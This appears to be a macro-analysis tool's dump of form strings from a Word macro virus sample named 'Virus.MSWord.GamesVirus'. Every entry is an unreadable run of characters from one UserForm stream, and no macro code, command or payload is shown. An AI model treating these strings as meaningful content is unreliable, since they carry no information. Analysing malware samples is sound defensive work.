- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY'9Q(Ba)Ji)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY BQ(BY(BY Ba)Ja)Ja)Ji1Ji(Ba BY BY Ba)Ji2Rq)Ja(Ba BY BY)Ja)Ja2Rq2Rq)Ja(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dc�Ek�=k�=ky;Zq)Ja)Ji)Ji)Ji1Jq)Ji)Ji)Ji(Ba)Ji*Ri2Rq2Rq1Ji)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I;Z�2Rq1Ji2Rq2Rq2Rq<c�3Zy)Ja(Ba1Ji)Ji(Ba'9Q;Z�)Ji)Ja(Ba'9Y1Jq)Ja BY1Ji(Ba)Ja)Ji Ba)Ja)Ja1Ji2Rq;Zy2Ri(Ba(Ba(Ba(Ba BY)Ja)Ja Ba)Ji2Ri2Ri)Ja Ba)Ja)Ji BY BY'9Y'9Y)Ji(Ba(Ba)Ja BY'9Y'9Q BY)Ja(Ba(Ba1Ji2Ri3Zq2Rq BY(BY(Ba(BY)Ja BY'9Q(BY(BY(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji2Ri2Rq3Zy*Ri2Rq2Rq*Ri2Rq2Rq2Rq3Zy2Rq3Zq3Zq)Ji)Ji2Rq2Ri2Rq2Rq2Ri2Rq2Ri1Jq)Ji)Ji2Rq2Rq2Rq2Rq2Rq;ZyEk�=k�<c�;Z�*Ri)Ji)Ji2Rq;Zy2Rq2Rq2Rq2Ri2Rq!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji<cy;Zy3Zy*Ri)Ji(Ba'9Y BY Ba Ba)Ji)Ja2Rq2Rq)Ja)Ji2Rq;Zy;Zy(Ba(Ba)Ji BY BY(Ba)Ja2Rq*Ri)Ja(Ba(BY(BY/9Y'9Y(Ba)Ji2Rq2Rq1Ji)Ji2Ri)Ja)Ji)Ji)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY2Rq3Zy2Rq(Ba'9Q'9Q'9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y)Ja)Ji2Rq2Rq3Zq2Ri(BY(Ba)Ji)Ja)Ja(Ba BY2Rq2Rq)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<cy*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q(BY)Ja)Ja)Ja BY(BY BY BY(BY BQ'9Y'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY Ba)Ja)Ji)Ja2Ri)Ji BQ)Ji1Ji)Ji2Rq2Rq2Rq1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba(Ba!Ja2Rq3Zy)Ja(Ba!Ja+Zq)Ja BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja BY BY(Ba BY BY BY)Ja2Rq)Ji Ba)Ji2Ri;Zy;Zy2Ri;Zy<c�3Zy)Ji)Ja BY Ba(Ba)Ji3Zy)Ji)Ja)Ja BY)Ja)Ja)Ja)Ji Ba)Ji2Rq*Ri)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0'9Q(Ba)Ja1Ji)Ja2Rq;Zy*Rq)Ja)Ji*Ri2Rq3Zq*Rq2Rq*Ri)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zy2Rq2Rq*Ri)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y!Ja*Rq3Zq Ba(Ba(Ba(Ba)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja2Rq<c�<c�)Ji(Ba)Ji*Ri<c�2Rq)Ji)Ji)Ji)Ji)Ji)Ja)Ja2Rq3Zq)Ja BY BY)Ja3Zq2Rq)Ji(Ba)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji*Ri)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y BY)Ji2Rq*Ri*Rq2Rq*Ri)Ji)Ja'9Q&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q(Ba*Ri2Rq)Ji)Ji2Rq)Ji)Ji)Ji)Ja)Ji)Ji)Ji)Ja BY BY)Ja)Ja)Ji(Ba BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zq)Ji Ba(Ba BY(Ba2Ri<cy3Zy)Ji Ba BY BY(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY)Ja)Ja BY BY(Ba)Ja1Ji2Rq)Ji2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;Zy;Zy3Zy;Zy2Rq Ba(BY BY BY)Ji)Ji2Ri2Ri)Ja(Ba)Ji2RqEk�<c�<c�;Zy)Ja)Ja1Ji3Zy2Rq2Rq BY(Ba Ba)Ja BY2Rq BY)Ji3Zq2Rq2Ri2Rq2Rq3Zq1Ji(Ba Ba'9Q3Zy2Ri(Ba BY)Ja)Ja(BY)Ji2Rq)Ji)Ji BY'9Q BY BY)Ja1Ji)Ja)Ja(BY)Ja2Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji*Rq2Ry2Rq2Ri2Ri)Ja)Ji)Ji)Ja)Ji)Ji)Ji/9Y(BY2Rq3Zy2Ri*Ri2Rq)Ji Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji2Rq3Zq;Zy2Ri2Rq2Ry*Ri)Ji)Ji(Ba)Ji)Ji2Rq2Rq)Ja2Rq2Rq3Zy;Zy3Zy2Rq1Ji(BY(Ba)Ji)Ji)Ja)Ja2RqEk�<c�<cy2Rq)Ja)Ja)Ji)Ji2Rq2Ri)Ji(Ba;ZyEk�Ek�<c�2Ry2Rq)Ja(Ba'9Q Ba2Ry2Rq2Rq)Ji BY*Ri(Ba'9Y(Ba*Ri2Rq2Rq)Ji)Ji2Rq2Rq;Zy<cy<cy<cq)Ja)Ji)Ji(Ba)Ji1Ji)Ji)Ji)Ja)Ja2Rq2Rq2Rq1Jq)Ja(Ba2Rq3Zy)Ji Ba2Rq2Rq2Rq3Zy3Zy2Rq2Rq1Ji1Ji)Ji)Ja1Ji1Ji)Ja)Ja Ba Ba)Ja)Ji)Ji2Rq)Ji)Ji)Ja BY)Ji3Zy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(Ba)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji)Ji(Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji*Rq;Zy;Zy2Rq1Ji)Ja)Ji)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Rq*Rq2Rq)Ja)Ji3Z�4c�3Z�2Rq2Rq2Rq3Zy<cy;Zy)Ji(Ba(Ba BY)Ji2Rq Ba BY BY BY)Ja)Ji2Rq2Rq*Ri3Zq3Zy)Ji2Rq*Ri3Zq)Ji Ba)Ji BY BY)Ja3Zy<c�'9Q BY2Rq(BY2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji)Ji)Ji)Ji'9Y'9Y)Ji3Zy=k�<c�3Zq*Rq2Ri BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I*Ra<cy3Zq)Ja(Ba Ba)Ja)Ja BY(Ba(Ba2Rq;Zy*Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY2Ri<cy2Rq)Ji*Ri2Rq)Ji)Ji)Ja)Ja)Ji)Ji)Ji2Rq3Zq3Zy2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY(Ba BY'9Q(Ba*Ri3Zq2Ri BY Ba Ba Ba(Ba BY)Ja;Zy2Rq)Ji3Zy3Zy2Rq2Rq3Zq3Zy*Rq*Ri2Ri BY Ba)Ji*Rq3Zy3Zy3Zy2Rq)Ja)Ja)Ji)Ja(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8 BY*Rq1Ji)Ja(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zy2Rq1Ji BY BY BY BY2Rq2Rq2Rq)Ji*Ri)Ji2Rq2Rq*Ri(Ba'9Q&1Q'9Q'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1Q)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji BY BY'9Y BY Ba)Ji Ba)Ja)Ja BY(Ba*Ri*Ri)Ja(BY)Ja2Ri3Zq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BQ)Ja)Ja!Ja(BY BY(Ba(BY'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba(Ba2Rq2Rq)Ja BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji)Ji)Ji2Rq*Rq3Zy;Zy*Ri1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<cy3Zq2Rq2Rq2Rq2Rq)Ja)Ji2Rq2Rq2Rq*Rq*Rq*Rq)Ji)Ji)Ji)Ji2Rq2Rq*Rq3Zy4c�=k�3Zy(Ba(Ba BY BY(Ba)Ja)Ji1Ji)Ji)Ji3Zq(Ba*Rq*Rq BY)Ja BY BY)Ji*Ri)Ji(Ba3Zy;Zy3Zy Ba3Zy2Rq2Rq3Zy3Zy;Zy2Rq)Ja BY(Ba)Ji'9Q'9Q3Zy2Rq)Ja(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY3Zq3Zq2Rq*Ri*Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ja*Ri2Rq)Ji)Ji(Ba(Ba2Rq3Zy3Zq2Rq*Ri)Ji)Ji)Ji3Zy*Ri'9Y Ba Ba)Ji)Ji)Ja)Ji3Zy*Ri)Ji(Ba'9Q'9Q BY Ba BY'9Q(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ji)Ji)Ji BY BY)Ja)Ja(Ba(Ba'9Q BY Ba*Ri2Rq)Ji1Ji2Ri)Ja)Ji2Rq2Rq3Zy*Rq*Ri)Ji)Ja)Ji)Ji BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba*Rq)Ji)Ji)Ji)Ji2Rq)Ji Ba)Ji*Ri(Ba BY BY(Ba Ba Ba)Ja*Ri*Ri(Ba Ba1Ji2Rq<cy2Rq2Rq<c�<c�)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja*Rq*Rq*Ri)Ja)Ja)Ji)Ji2Rq)Ji(Ba)Ji*Ri)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9Q)Ja1Ji1Ji)Ji<c�3Zy*Ri2Ri2Rq3Zy3Zy*Ri)Ji)Ji)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY)Ja3Zy3Zy)Ji1Ji)Ja'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY2Rq3Zy)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dcy;Zy2Rq2Rq2Rq2RqEky<cy3Zy2Rq(Ba1Ji2Rq2Rq2Rq)Ja)Ja)Ja'9Y BY(Ba(Ba2Rq;Zy;Zy1Ji(BY(BY)Ja(Ba)Ji1Ji1Ji2Rq2Rq2Rq3Zy4cy<cy<c� BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9Y*Rq)Ja)Ji3Z�2Rq Ba;Zy1Ji2Rq)Ji2Rq)Ji2Rq)Ja(BY(BY BY1Ji/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba)Ji3Zq2Rq)Ja)Ja2Ri3Zy2Ri(BY)Ji;Zy Ba BY(Bi)Ji1Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY)Ja)Ja2Rq2Rq)Ji2Ri)Ji)Ji)Ja)Ja2Rq3Zy2Ry1Jq(Ba BY BY BY)Ji)Ji(Ba1Ji2Rq3Zq;Zy)Ja1Ji1Ji)Ja(Ba BY BY)Ji(BY(Ba(Ba)Ja;Zy2Rq'9Q)Ja)Ja)Ja)Ji*Rq)Ji(Ba(Ba1Ji2Rq*Ri BY)Ji*Ri(BY'9Q(BY(BY BY(BY BY'9Q(BY(BY(BY BY(Ba)Ji)Ja)Ji2Rq*Ri2Ri2Rq)Ji)Ja2Rq3Zy)Ja)Ja)Ja)Ji)Ji)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(BY)Ja1Ji)Ja)Ja)Ja)Ja2Rq*Rq!Ja)Ji)Ji)Ja2Ri*Ri)Ji)Ji)Ji(Ba(BY BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9QEk�<c�2Rq2Rq*Ri3Zy)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba1Ji2Ri2Rq2Rq2Ry3Zy)Ji(Ba Ba(Ba)Ji2Rq;Zy2Rq)Ji2Rq)Ji)Ji;Z�3Zy)Ji(Ba'9Y2Rq;Z�2Ri3ZyEk�=k�Dc�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��P��P��Ns�Fs�Fs�<cy3Zq3Zy2Rq2Rq)Ji BY3ZqNs�Fs�Ek�*Ri)Ji)Ji)Ja)Ji BY BY2Rq3Zq)Ja(BY BQ BY BY BY(BY)Ja)Ja3Zq4c�)Ji BY)Ji)Ji!Ja)Ja;Zq BY2Rq)Ji'9Q<c� BY Ba;Zy)Ji)Ja)Ja*Ri)Ja(Ba Ba1Ji)Ji)Ja3Zy3Zq2Ri)Ji)Ji)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji)Ja)Ja2Rq<c�=k�3Zi*Ri*Rq*Rq2Rq3Zq<cy3Zq)Ja'9Q'9Q BY)Ja)Ja)Ja)Ja(BY1Ji2Rq*Rq2Rq2Rq*Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY(Ba(Ba)Ji<cy3Zq2Rq)Ji(Ba1Ji)Ji(Ba2Rq)Ja BY(Ba)Ji)Ji1Ji(BY)Ja)Ji)Ja)Ji*Ri*Rq2Rq*Ri)Ji(Ba)JaDc�2Rq'9Q*Ri*Ri)Ji)Ji(BY)Ja)Ja)Ji*Ri*Ri)Ji)Ji*Ri2Rq1Ji*Ri2Rq)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q BY BY)Ji1Ji)Ji Ba2Rq3Zq3Zy<c�3Zq)Ja'9Y BY(BY BY*Ri3Zq BQ'9Q BY*Ri2Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I*Ri3Zy2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja2Ri2Ri)Ja'9Y)Ji*Rq)Ji)Ji)Ji)Ji)Ji)Ji)Ji)Ji*Ri;Zy*Rq)Ji)Ja BY)Ja)Ja Ba'9Y BY Ba(Ba BQ'9Q BY)Ji1Ji1Ji)Ja)Ja BY BY BY*Rq3Zy3Zy*Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Z�2Rq BY;Zy<c�2Rq:Rq2Ri)Ja)Ja)Ji'9Y BY BY)Ji)Ja BY)Ji3Zy2Ri)Ji Ba(BY&1I*Ra=k�<c�3Zy1Ji Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y(Ba2Ri1Ji)Ja BY(Ba)Ji1Ji)Ji)Ji2Rq1Ji2Rq<c�*Ri(BY2Rq2RqEk�2Rq)Ji:Ri)Ji)Ji1Ji)Ji2Rq2Rq*Rq)Ji BY BY(BY)Ja2Ri3Zy*Rq(Ba'9Q BY2Ri3Zy3Zy;Zy2Ri2Rq<cy)Ja)Ja3Zy<cyMk�2Ri)Ja<c�;Zy2Rq2Ri BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y2Rq2Rq)Ja)Ji)Ji2Rq2Ri)Ja)Ja)Ja*Ri;Zy3Zy2Rq1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q'9Q'9Q'9Y(Ba2Ri2Rq)Ja BY BY BY(Ba)Ja)Ji2Rq2Rq2Rq2Rq)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(BY BY BY)Ja)Ji(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(BY BY'9Y(Ba2Ri Ba'9Y BY)Ja(BY BY(Ba*Rq*Ri)Ji'9Y(Ba2Rq2Rq2Rq<c�<c�2Rq)Ja(Ba)Ji(Ba'9Q)Ji<c�2Rq Ba BY BY BY;Zy<c�1Ji2Rq)Ji BY BY)Ji2Rq2Rq)Ji)Ji)Ja)Ji2Rq3Zy3Zq2Rq)Ji1Ji)Ji*Ri;Zy)Ji(Ba*Rq2Rq3Zq2Rq)Ji2Rq2Rq)Ji)Ja BY'9Q(Ba(Ba(BY(BY Ba'9Q'9Q(Ba1Ji(Ba BY BY BY(Ba)Ja Ba(Ba BY Ba)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja BY)Ja*Ri)Ji(Ba(Ba(Ba2Rq3Zy2Rq)Ja BY)Ja)Ja)Ji)Ji)Ji3Zy Ba BY1Jq)Ja BY(Ba)Ja1Ji1Ji)Ji)Ji BY!Ja2Rq)Ji Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q(BY*Ri2Rq)Ja BY'9Q BY)Ji2Rq+Zy<c�3Zy3Zy3Zy BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
